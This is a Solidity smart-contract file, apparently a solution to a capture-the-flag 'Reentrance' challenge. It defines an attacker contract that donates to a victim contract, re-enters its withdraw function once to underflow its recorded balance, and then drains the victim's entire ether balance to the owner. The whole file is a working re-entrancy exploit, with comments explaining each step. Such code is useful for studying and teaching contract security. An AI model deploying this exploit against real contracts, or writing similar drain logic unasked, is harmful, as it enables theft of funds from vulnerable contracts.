pragma solidity ^0.6.0;

import './Re-entrancy.sol';

contract ReentrancyAttack {
    Reentrance private victim;
    address private owner;
    uint256 private initialDonation;
    bool private exploited;
    constructor(Reentrance _victim) public {
        owner = msg.sender;
        victim = _victim;
        exploited = false;
    }
    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call.value(balance)("");
        require(success, "withdraw failed");
    }
    function exploit() external payable {
        require(msg.value > 0, "donate something!");
        initialDonation = msg.value;
        // donate 1 wei to ourself
        victim.donate.value(msg.value)(address(this));
        // withdraw 1 way and trigger the re-entrancy exploit
        victim.withdraw(initialDonation);
        // because the victim contract underflowed our balance
        // we are now able to drain the whole balance of the contract
        victim.withdraw(address(victim).balance);
    }
    receive() external payable {
        // We need to re-enter only once
        // By re-entering our new balance will be equal to (2^256)-1
        if (!exploited) {
            exploited = true;
            // re-enter the contract withdrawing another wei
            victim.withdraw(initialDonation);
        }
    }
}